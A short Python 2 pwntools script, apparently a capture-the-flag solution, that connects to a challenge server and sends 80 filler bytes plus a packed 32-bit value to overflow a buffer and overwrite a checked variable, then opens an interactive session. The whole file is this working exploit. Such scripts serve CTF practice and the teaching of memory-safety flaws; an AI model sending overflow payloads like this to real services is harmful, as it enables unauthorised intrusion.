#!/usr/bin/env python2

from pwn import *

conn = remote("challenge.acictf.com", 28923)

def main():
    conn.recvuntil("string: ")
    conn.sendline("a"*80 + p32(946357351))
    conn.interactive()


if __name__ == "__main__":
    main()
